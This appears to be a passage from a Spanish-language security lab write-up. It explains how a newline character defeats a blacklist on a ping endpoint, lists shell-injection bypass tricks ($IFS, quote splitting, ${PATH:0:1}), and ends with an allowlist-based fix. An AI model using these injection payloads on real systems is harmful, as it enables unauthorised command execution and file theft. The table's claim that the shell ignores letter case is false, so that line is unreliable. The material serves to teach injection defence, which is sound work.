## El lab tiene un filtro... que se rompe

El endpoint `/secure-ping` bloquea `;`, `&&`, `||`, `` ` `` y `$()`. Pero:

```bash
# Bloqueado:
curl "http://127.0.0.1:18084/secure-ping?host=8.8.8.8;cat%20/flag"
# → Error: character ";" is not allowed

# BYPASS con newline (%0a = URL-encoded \n):
curl "http://127.0.0.1:18084/secure-ping?host=8.8.8.8%0acat%20/tmp/flags/flag3_filtered.txt"
```

El filtro busca `;` pero la shell también interpreta `\n` (nueva línea) como
separador de comandos. El filtro olvidó bloquearlo.

## Otras técnicas de bypass

```text
Filtro: bloquea ";"         → Bypass: %0a (newline), | (pipe), & (single)
Filtro: bloquea "cat"       → Bypass: c'a't, c"a"t, /bin/cat, head, more
Filtro: bloquea espacios    → Bypass: $IFS, ${IFS}, < (redirect), %09 (tab)
Filtro: bloquea "/"         → Bypass: ${PATH:0:1}, ..\/..\/ (path traversal)
Filtro: case-sensitive      → Bypass: CAT, Cat, cAt (la shell no distingue)
```

## La lección definitiva

**Una blacklist SIEMPRE es incompleta**. La mitigación correcta:

```python
# BIEN (allowlist + no shell):
if not re.match(r'^[\d.]+$', host):  # solo números y puntos
    return 'Invalid host'
result = subprocess.run(['ping', '-c', '1', '-W', '2', host])  # lista, no string
```

Al pasar una LISTA (no string) a subprocess sin `shell=True`, Python NO usa la shell
y la inyección es imposible.
